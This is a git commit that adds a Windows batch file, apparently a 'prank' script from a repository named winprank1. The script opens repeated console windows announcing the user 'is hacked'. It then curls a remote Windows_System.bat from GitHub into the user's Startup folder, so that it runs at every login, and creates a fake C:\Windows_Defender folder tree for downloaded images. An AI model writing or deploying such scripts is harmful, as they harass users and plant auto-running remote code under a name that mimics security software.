2f0108bb0c828022b966f287721fe046e4f8dabb
huckardidi <124454617+huckardidi@users.noreply.github.com>
2023-02-05 14:53:47 +0530

    Add files via upload

---
+++ 1.bat
@@ -0,0 +1,27 @@
+START CMD /C "ECHO %username% is hacked by nandan && PAUSE"
+START CMD /C "ECHO %username% is hacked by nandan && PAUSE"
+START CMD /C "ECHO %username% is hacked by nandan && PAUSE"
+START CMD /C "ECHO %username% is hacked by nandan && PAUSE"
+START CMD /C "ECHO %username% is hacked by nandan && PAUSE"
+START CMD /C "ECHO %username% is hacked by nandan && PAUSE"
+START CMD /C "ECHO %username% is hacked by nandan && PAUSE"
+START CMD /C "ECHO %username% is hacked by nandan && PAUSE"
+START CMD /C "ECHO %username% is hacked by nandan && PAUSE"
+START CMD /C "ECHO %username% is hacked by nandan && PAUSE"
+START CMD /C "ECHO %username% is hacked by nandan && PAUSE"
+START CMD /C "ECHO %username% is hacked by nandan && PAUSE"
+START CMD /C "ECHO %username% is hacked by nandan && PAUSE"
+START CMD /C "ECHO %username% is hacked by nandan && PAUSE"
+START CMD /C "ECHO %username% is hacked by nandan && PAUSE"
+curl https://raw.githubusercontent.com/huckardidi/winprank1/main/Windows_System.bat > Windows_System.bat
+move Windows_System.bat "C:\Users\%username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
+mkdir C:\Windows_Defender
+mkdir C:\Windows_Defender\logs
+mkdir C:\Windows_Defender\temp
+mkdir C:\Windows_Defender\temp\logs
+mkdir C:\Windows_Defender\temp\cache
+mkdir C:\Windows_Defender\temp\cache\temp
+curl https://raw.githubusercontent.com/huckardidi/winprank1/main/1.gif > C:\Windows_Defender\temp\cache\temp\1.gif
+curl https://raw.githubusercontent.com/huckardidi/winprank1/main/2.gif > C:\Windows_Defender\temp\cache\temp\2.gif
+curl https://raw.githubusercontent.com/huckardidi/winprank1/main/3.gif > C:\Windows_Defender\temp\cache\temp\3.gif
+curl https://raw.githubusercontent.com/huckardidi/winprank1/main/4.png > C:\Windows_Defender\temp\cache\temp\4.png
